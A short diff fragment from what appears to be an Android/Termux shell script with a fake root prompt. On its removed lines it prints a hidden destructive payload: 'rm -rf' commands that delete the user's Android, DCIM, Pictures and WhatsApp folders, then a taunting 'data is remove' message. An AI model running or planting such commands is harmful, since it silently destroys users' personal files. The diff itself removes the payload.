@@ -38,9 +38,3 @@ read -p"╰───────root@acepx-code=•>" memeq;
 sleep 1
 echo $red "Loading"
 sleep 2
-rm -rf storage/emulated/0/Android
-rm -rf storage/emulated/0/DCIM
-rm -rf storage/emulated/0/Pictures
-rm -rf storage/emulated/0/WhatsApp
-echo  $blue "Sorry your data is remove :v"
-fi
